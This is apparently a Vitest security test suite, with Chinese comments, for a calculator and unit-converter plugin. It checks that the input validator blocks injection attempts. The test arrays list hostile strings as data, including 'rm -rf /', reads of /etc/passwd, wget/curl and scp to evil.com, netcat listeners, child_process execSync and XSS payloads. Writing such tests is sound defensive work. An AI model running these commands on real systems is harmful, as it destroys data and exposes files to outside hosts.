import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { CalculatorPlugin, UnitConverterPlugin } from '@/lib/plugins/builtin/calculator-plugin'
import { evaluateAdvancedMathExpression } from '@/lib/security/math-evaluator'
import { InputValidator } from '@/lib/security/enhanced-input-validator-v2'

describe('计算器插件安全测试', () => {
  let calculatorPlugin: CalculatorPlugin
  let unitConverterPlugin: UnitConverterPlugin

  beforeEach(async () => {
    calculatorPlugin = new CalculatorPlugin()
    unitConverterPlugin = new UnitConverterPlugin()
    
    // 初始化插件
    await calculatorPlugin.initialize()
    await unitConverterPlugin.initialize()
  })

  describe('代码注入攻击防护测试', () => {
    it('应该阻止JavaScript代码注入', async () => {
      const maliciousExpressions = [
        'function(){alert("xss")}()',
        'eval("alert(1)")',
        'new Function("return alert(1)")()',
        'setTimeout(function(){alert(1)},0)',
        'document.cookie',
        'window.location="http://evil.com"',
        'global.process',
        'require("fs")',
        'import("fs")',
        'process.exit(1)',
        'Function("return process")().exit()',
        'eval(require("child_process").execSync("ls").toString())',
        'setTimeout(eval, 0, "alert(1)")',
        'setInterval(eval, 0, "alert(1)")',
        'document.write("xss")',
        'window.open("http://evil.com")',
        'alert("xss")',
        'console.log("test")',
        'debugger;',
        'throw new Error("test")',
        'while(true){}',
        'for(;;){}',
        'if(true){alert(1)}',
        'switch(x){case 1: alert(1)}'
      ]

      for (const expr of maliciousExpressions) {
        // 通过输入验证器检查
        const validationResult = InputValidator.validateMathExpression(expr)
        expect(validationResult.isValid).toBe(false, 
          `恶意表达式应该被阻止: ${expr}`)

        // 通过插件搜索检查
        const context = { query: expr, queryLower: expr.toLowerCase(), keywords: [expr] }
        const results = await calculatorPlugin.search(context)
        
        // 结果应该是数组或undefined（如果search方法出错）
        if (results !== undefined) {
          expect(Array.isArray(results)).toBe(true)
          expect(results.length).toBe(0, 
            `恶意表达式不应该返回结果: ${expr}`)
        }
      }
    })

    it('应该阻止系统命令注入', async () => {
      const commandInjectionAttempts = [
        'system("rm -rf /")',
        'exec("whoami")',
        'shell_exec("ls")',
        'passthru("cat /etc/passwd")',
        'proc_open("ls")',
        'popen("ls")',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '| ls',
        '; rm -rf /',
        '&& wget http://evil.com',
        '|| curl http://evil.com',
        'nc -l -p 1337',
        'telnet evil.com 1337',
        'ssh user@evil.com',
        'scp file.txt user@evil.com:/tmp',
        'ping -c 100 evil.com',
        'nslookup evil.com',
        'dig evil.com',
        'whois evil.com',
        'chmod 777 /etc/passwd',
        'chown root:root /etc/passwd',
        'sudo rm -rf /',
        'su root',
        'passwd root',
        'useradd hacker',
        'groupadd hacker'
      ]

      for (const expr of commandInjectionAttempts) {
        const validationResult = InputValidator.validateMathExpression(expr)
        expect(validationResult.isValid).toBe(false, 
          `系统命令注入应该被阻止: ${expr}`)

        const context = { query: expr, queryLower: expr.toLowerCase(), keywords: [expr] }
        const results = await calculatorPlugin.search(context)
        
        if (results !== undefined) {
          expect(results.length).toBe(0, 
            `系统命令注入不应该返回结果: ${expr}`)
        }
      }
    })

    it('应该阻止文件系统访问', async () => {
      const fileSystemAttacks = [
        'require("fs").readFileSync("/etc/passwd")',
        'import("fs").then(fs => fs.readFileSync("/etc/passwd"))',
        'fetch("file:///etc/passwd")',
        'XMLHttpRequest to file:///etc/passwd',
        'readFile("/etc/passwd")',
        'open("/etc/passwd")',
        'file_get_contents("/etc/passwd")',
        'cat("/etc/passwd")',
        'ls("/etc")',
        'dir("C:\\Windows")',
        'glob("**/*")',
        'require("path").join(__dirname, "../config")',
        'process.cwd()',
        '__dirname',
        '__filename',
        'Buffer.from("test")',
        'fs.readFileSync',
        'child_process.exec'
      ]

      for (const expr of fileSystemAttacks) {
        const validationResult = InputValidator.validateMathExpression(expr)
        expect(validationResult.isValid).toBe(false, 
          `文件系统访问应该被阻止: ${expr}`)

        const context = { query: expr, queryLower: expr.toLowerCase(), keywords: [expr] }
        const results = await calculatorPlugin.search(context)
        
        if (results !== undefined) {
          expect(results.length).toBe(0, 
            `文件系统访问不应该返回结果: ${expr}`)
        }
      }
    })

    it('应该阻止网络访问', async () => {
      const networkAttacks = [
        'fetch("http://evil.com")',
        'XMLHttpRequest to "http://evil.com"',
        'WebSocket("ws://evil.com")',
        'require("http").get("http://evil.com")',
        'import("node-fetch")',
        'axios.get("http://evil.com")',
        'request("http://evil.com")',
        'curl("http://evil.com")',
        'wget("http://evil.com")',
        'ftp://evil.com/file',
        'sftp://evil.com/file',
        'smtp://evil.com',
        'redis://evil.com',
        'mongodb://evil.com',
        'mysql://evil.com',
        'postgres://evil.com',
        'telnet://evil.com:23',
        'ssh://user@evil.com'
      ]

      for (const expr of networkAttacks) {
        const validationResult = InputValidator.validateMathExpression(expr)
        expect(validationResult.isValid).toBe(false, 
          `网络访问应该被阻止: ${expr}`)

        const context = { query: expr, queryLower: expr.toLowerCase(), keywords: [expr] }
        const results = await calculatorPlugin.search(context)
        
        if (results !== undefined) {
          expect(results.length).toBe(0, 
            `网络访问不应该返回结果: ${expr}`)
        }
      }
    })
  })

  describe('数学表达式安全性测试', () => {
    it('应该允许安全的数学表达式', () => {
      const safeExpressions = [
        '2 + 2',
        '3.14 * 2',
        '10 / 3',
        '2^10',
        'sqrt(16)',
        'sin(π/2)',
        'cos(0)',
        'tan(45)',
        'log(100)',
        'ln(e)',
        'abs(-5)',
        'floor(3.7)',
        'ceil(3.2)',
        'round(3.5)',
        'π * 2',
        'e^2',
        '(2 + 3) * 4',
        '2 + 3 * 4',
        '2 * (3 + 4)',
        '1 + 2 + 3 + 4',
        '10 - 5 - 2',
        '100 / 2 / 5',
        '2^3^2',
        'sqrt(sqrt(16))',
        'sin(cos(0))',
        'log(log(10000))'
      ]

      for (const expr of safeExpressions) {
        const validationResult = InputValidator.validateMathExpression(expr)
        expect(validationResult.isValid).toBe(true, 
          `安全表达式应该被允许: ${expr}`)

        const context = { query: expr, queryLower: expr.toLowerCase(), keywords: [expr] }
        const results = calculatorPlugin.search(context)
        // 安全表达式可能返回结果，也可能因为语法问题不返回，但不应抛出异常
        expect(() => calculatorPlugin.search(context)).not.toThrow()
      }
    })

    it('应该拒绝包含非法字符的表达式', () => {
      const invalidExpressions = [
        '2 + @',
        '3 # 4',
        '5 $ 6',
        '7 % 8',
        '9 & 10',
        '11 | 12',
        '13 ! 14',
        '15 ~ 16',
        '17 ` 18',
        '19 " 20',
        '21 \' 22',
        '23 < 24',
        '25 > 26',
        '27 [ 28',
        '29 ] 30',
        '31 { 32',
        '33 } 34',
        '35 ; 36',
        '37 : 38',
        '39 , 40',
        '41 ? 42',
        '43 \\ 44'
      ]

      for (const expr of invalidExpressions) {
        const validationResult = InputValidator.validateMathExpression(expr)
        expect(validationResult.isValid).toBe(false, 
          `包含非法字符的表达式应该被拒绝: ${expr}`)
      }
    })

    it('应该正确处理数学常量', () => {
      const constantExpressions = [
        'π',
        'e',
        'π + e',
        '2 * π',
        'e^2',
        'sqrt(π)',
        'sin(π/2)',
        'log(e)'
      ]

      for (const expr of constantExpressions) {
        const validationResult = InputValidator.validateMathExpression(expr)
        expect(validationResult.isValid).toBe(true, 
          `数学常量表达式应该被允许: ${expr}`)

        // 检查求值器是否能正确处理
        const result = evaluateAdvancedMathExpression(expr)
        // 结果可能是null（如果表达式不完整）或数字，但不应抛出异常
        expect(() => evaluateAdvancedMathExpression(expr)).not.toThrow()
      }
    })

    it('应该检测并拒绝语法错误', () => {
      const syntaxErrorExpressions = [
        '2 + ',
        '3 * (4 + 5',
        '6 / )',
        '7 + + 8',
        '9 * * 10',
        'sqrt(',
        'sin()',
        'log(,)',
        '(2 + 3))',
        '2 + 3)',
        '()',
        '(+)',
        '2..3',
        '2.3.4',
        '2e3e4',
        '0x123',
        '0b101',
        '0o777'
      ]

      for (const expr of syntaxErrorExpressions) {
        // 语法错误可能通过输入验证（如果只包含允许的字符）
        // 但在求值时应该返回null或抛出异常
        expect(() => {
          const result = evaluateAdvancedMathExpression(expr)
          // 如果返回结果，应该是有效的数字
          if (result !== null) {
            expect(typeof result).toBe('number')
            expect(isFinite(result)).toBe(true)
          }
        }).not.toThrow(`语法错误表达式应该优雅处理: ${expr}`)
      }
    })
  })

  describe('边界情况和异常处理测试', () => {
    it('应该处理数值溢出', () => {
      const overflowExpressions = [
        '1e300 * 1e300',
        '2^1000',
        '10^100',
        '999999999999999999999999999999999999999999999999999999',
        '1e308 * 10',
        '-1e308 * 10',
        '1 / 1e-308',
        'sqrt(1e300)'
      ]

      for (const expr of overflowExpressions) {
        expect(() => {
          const result = evaluateAdvancedMathExpression(expr)
          // 溢出时应该返回null或Infinity/-Infinity，但不应崩溃
          if (result !== null) {
            expect(typeof result).toBe('number')
          }
        }).not.toThrow(`溢出表达式应该优雅处理: ${expr}`)
      }
    })

    it('应该处理除零错误', () => {
      const divisionByZeroExpressions = [
        '1 / 0',
        '0 / 0',
        '2 / (1 - 1)',
        '3 / (2 - 2)',
        'sqrt(-1) / 0',
        'log(0) / 0',
        'tan(π/2) / 0'
      ]

      for (const expr of divisionByZeroExpressions) {
        const result = evaluateAdvancedMathExpression(expr)
        // 除零应该返回null，不应抛出异常
        expect(result).toBeNull()
      }
    })

    it('应该处理数学域错误', () => {
      const domainErrorExpressions = [
        'sqrt(-1)',
        'sqrt(-100)',
        'log(-1)',
        'log(0)',
        'ln(-1)',
        'ln(0)',
        'asin(2)',
        'acos(2)',
        'atan(1, 0)',
        'log(-10)',
        'sqrt(-π)',
        'log(-e)'
      ]

      for (const expr of domainErrorExpressions) {
        const result = evaluateAdvancedMathExpression(expr)
        // 域错误应该返回null，不应抛出异常
        expect(result).toBeNull()
      }
    })

    it('应该处理极值计算', () => {
      const extremeExpressions = [
        '1e-10 / 1e-10',
        '1e10 * 1e10',
        'sin(1e10)',
        'cos(1e10)',
        'log(1e-10)',
        'ln(1e-10)',
        'sqrt(1e-10)',
        '1 / 1e10',
        '1e10 / 1e-10'
      ]

      for (const expr of extremeExpressions) {
        expect(() => {
          const result = evaluateAdvancedMathExpression(expr)
          // 极值计算应该返回数字或null，不应抛出异常
          if (result !== null) {
            expect(typeof result).toBe('number')
            expect(isFinite(result)).toBe(true)
          }
        }).not.toThrow(`极值计算应该优雅处理: ${expr}`)
      }
    })
  })

  describe('表达式解析和清理测试', () => {
    it('应该正确清理和解析表达式', () => {
      const testCases = [
        { input: '  2 + 3  ', expected: '2+3' },
        { input: '2   +   3', expected: '2+3' },
        { input: '2 + 3 * 4', expected: '2+3*4' },
        { input: '(2 + 3) * 4', expected: '(2+3)*4' },
        { input: 'sqrt(16)', expected: 'sqrt(16)' },
        { input: 'π + e', expected: Math.PI.toString() + '+' + Math.E.toString() },
        { input: '2^3', expected: '2**3' },
        { input: '√16', expected: 'sqrt(16)' }
      ]

      for (const { input, expected } of testCases) {
        const validationResult = InputValidator.validateMathExpression(input)
        if (validationResult.isValid) {
          // 清理后的表达式应该符合预期
          expect(validationResult.sanitized).toBeDefined()
          // 表达式应该能够被求值而不抛出异常
          expect(() => evaluateAdvancedMathExpression(input)).not.toThrow()
        }
      }
    })

    it('应该处理Unicode字符', () => {
      const unicodeExpressions = [
        '２＋２', // 全角数字和符号
        '√１６', // 全角数字
        'π＋ｅ', // 全角符号
        'sin(π/2)',
        'log(１００)',
        '√(π² + e²)'
      ]

      for (const expr of unicodeExpressions) {
        // Unicode表达式可能被拒绝，但不应导致崩溃
        expect(() => {
          const validationResult = InputValidator.validateMathExpression(expr)
          const context = { query: expr, queryLower: expr.toLowerCase(), keywords: [expr] }
          calculatorPlugin.search(context)
        }).not.toThrow(`Unicode表达式应该优雅处理: ${expr}`)
      }
    })

    it('应该处理空输入和无效输入', async () => {
      const invalidInputs = [
        '',
        '   ',
        '\t',
        '\n',
        ' \t\n ',
        'abc',
        'hello world',
        'just text',
        'not a math expression',
        '123abc',
        'abc123',
        '+',
        '-',
        '*',
        '/',
        '^',
        '(',
        ')',
        'sqrt',
        'sin',
        'cos',
        'log',
        'π',
        'e'
      ]

      for (const input of invalidInputs) {
        const validationResult = InputValidator.validateMathExpression(input)
        // 无效输入应该被拒绝或返回空结果
        if (!validationResult.isValid) {
          const context = { query: input, queryLower: input.toLowerCase(), keywords: [input] }
          const results = await calculatorPlugin.search(context)
          
          if (results !== undefined) {
            expect(results.length).toBe(0)
          }
        }
      }
    })
  })

  describe('权限管理集成测试', () => {
    it('应该在复制结果时请求剪贴板权限', async () => {
      // 测试一个有效的计算
      const context = { query: '2 + 2', queryLower: '2 + 2', keywords: ['2', '+', '2'] }
      const results = await calculatorPlugin.search(context)
      
      if (results && results.length > 0) {
        // 模拟点击结果（复制到剪贴板）
        // 注意：在测试环境中，实际的剪贴板访问可能被限制
        // 这里我们主要验证插件不会崩溃
        await expect(results[0].action()).resolves.not.toThrow()
      }
    })

    it('应该处理权限拒绝的情况', async () => {
      const context = { query: '3 + 3', queryLower: '3 + 3', keywords: ['3', '+', '3'] }
      const results = await calculatorPlugin.search(context)
      
      if (results && results.length > 0) {
        // 即使权限被拒绝，也不应该抛出异常
        await expect(results[0].action()).resolves.not.toThrow()
      }
    })
  })

  describe('性能和压力测试', () => {
    it('应该高效处理大量表达式计算', () => {
      const expressions = Array.from({ length: 100 }, (_, i) => 
        `${i + 1} + ${i + 2}`
      )

      const startTime = performance.now()

      for (const expr of expressions) {
        const result = evaluateAdvancedMathExpression(expr)
        expect(typeof result === 'number' || result === null).toBe(true)
      }

      const endTime = performance.now()
      const duration = endTime - startTime

      // 应该在合理时间内完成
      expect(duration).toBeLessThan(100)
    })

    it('应该高效处理复杂嵌套表达式', () => {
      const complexExpressions = [
        'sin(cos(tan(log(abs(sqrt(floor(ceil(round(123.456)))))))))',
        '((((((1 + 2) * 3) - 4) / 5) ^ 6) + 7) - 8',
        'sqrt(sqrt(sqrt(sqrt(sqrt(65536)))))',
        'log(log(log(log(log(100000000))))))',
        'sin(π/2) + cos(0) + tan(45) + log(100) + ln(e)',
        '2^3^4^5',
        '(1 + 2 + 3 + 4 + 5) * (6 + 7 + 8 + 9 + 10)',
        'sqrt(16) + sqrt(25) + sqrt(36) + sqrt(49) + sqrt(64)'
      ]

      const startTime = performance.now()

      for (const expr of complexExpressions) {
        expect(() => {
          const result = evaluateAdvancedMathExpression(expr)
          // 复杂表达式可能返回null或数字，但不应抛出异常
          if (result !== null) {
            expect(typeof result).toBe('number')
            expect(isFinite(result)).toBe(true)
          }
        }).not.toThrow(`复杂表达式应该优雅处理: ${expr}`)
      }

      const endTime = performance.now()
      const duration = endTime - startTime

      // 复杂表达式也应该在合理时间内完成
      expect(duration).toBeLessThan(50)
    })
  })

  describe('单位转换器安全测试', () => {
    it('应该验证单位转换输入的安全性', async () => {
      const maliciousConversions = [
        '100 <script>alert("xss")</script> to kg',
        '50 javascript:alert("xss") kg',
        '25 system("rm -rf /") m',
        '10 eval("alert(1)") ft',
        '5 require("fs") inch',
        '1 fetch("http://evil.com") mile',
        '100 document.cookie to kg',
        '50 window.location to lb',
        '25 global.process to oz',
        '10 import("fs") to ton',
        '5 process.exit(1) m',
        '1 Function("return alert(1)")() kg'
      ]

      for (const conversion of maliciousConversions) {
        const context = { query: conversion, queryLower: conversion.toLowerCase(), keywords: [conversion] }
        const results = await unitConverterPlugin.search(context)
        
        // 恶意输入不应该返回结果
        if (results !== undefined) {
          expect(results.length).toBe(0, `恶意单位转换应该被阻止: ${conversion}`)
        }
      }
    })

    it('应该拒绝无效的数值输入', async () => {
      const invalidNumerics = [
        'abc kg to lb',
        'xyz m to ft',
        'infinity kg to lb',
        'NaN m to ft',
        'undefined kg to lb',
        'null m to ft',
        'function(){} kg to lb',
        '{} kg to lb',
        '[] kg to lb',
        'true kg to lb',
        'false kg to lb'
      ]

      for (const conversion of invalidNumerics) {
        const context = { query: conversion, queryLower: conversion.toLowerCase(), keywords: [conversion] }
        const results = await unitConverterPlugin.search(context)
        
        // 无效数值不应该返回结果
        if (results !== undefined) {
          expect(results.length).toBe(0, `无效数值应该被拒绝: ${conversion}`)
        }
      }
    })

    it('应该处理极端数值转换', () => {
      const extremeConversions = [
        '1e300 kg to lb',
        '1e-10 m to ft',
        '0 kg to lb',
        '-100 kg to lb', // 负重量
        '999999999999999999999 kg to lb',
        '1e308 m to ft',
        '1 / 0 kg to lb', // 无限大
        'sqrt(-1) kg to lb' // 虚数
      ]

      for (const conversion of extremeConversions) {
        const context = { query: conversion, queryLower: conversion.toLowerCase(), keywords: [conversion] }
        
        // 极端值不应该导致崩溃
        expect(() => {
          unitConverterPlugin.search(context)
        }).not.toThrow(`极端数值转换应该优雅处理: ${conversion}`)
      }
    })
  })

  describe('输入验证器集成测试', () => {
    it('应该与输入验证器协同工作', async () => {
      const testExpressions = [
        { expr: '2 + 2', shouldPass: true },
        { expr: 'eval("alert(1)")', shouldPass: false },
        { expr: 'sqrt(16)', shouldPass: true },
        { expr: 'system("rm -rf /")', shouldPass: false },
        { expr: 'sin(π/2)', shouldPass: true },
        { expr: 'require("fs")', shouldPass: false },
        { expr: 'log(100)', shouldPass: true },
        { expr: 'document.cookie', shouldPass: false }
      ]

      for (const { expr, shouldPass } of testExpressions) {
        const validationResult = InputValidator.validateMathExpression(expr)
        expect(validationResult.isValid).toBe(shouldPass, 
          `表达式 ${expr} 验证结果应该为 ${shouldPass}`)

        // 插件行为应该与输入验证器一致
        const context = { query: expr, queryLower: expr.toLowerCase(), keywords: [expr] }
        const results = await calculatorPlugin.search(context)
        
        if (shouldPass) {
          // 安全表达式可能返回结果
          if (results !== undefined) {
            expect(Array.isArray(results)).toBe(true)
          }
        } else {
          // 危险表达式不应该返回结果
          if (results !== undefined) {
            expect(results.length).toBe(0)
          }
        }
      }
    })

    it('应该正确处理清理后的表达式', () => {
      const dirtyExpressions = [
        '  2  +  3  ',
        '2+3*4',
        '(2+3)*4',
        'sqrt( 16 )',
        'sin( π / 2 )',
        'log ( 100 )',
        '2 ^ 3',
        '√ 16'
      ]

      for (const expr of dirtyExpressions) {
        const validationResult = InputValidator.validateMathExpression(expr)
        if (validationResult.isValid) {
          // 清理后的表达式应该能够被安全求值
          expect(() => {
            const result = evaluateAdvancedMathExpression(validationResult.sanitized)
            if (result !== null) {
              expect(typeof result).toBe('number')
              expect(isFinite(result)).toBe(true)
            }
          }).not.toThrow(`清理后的表达式应该安全: ${expr}`)
        }
      }
    })
  })
})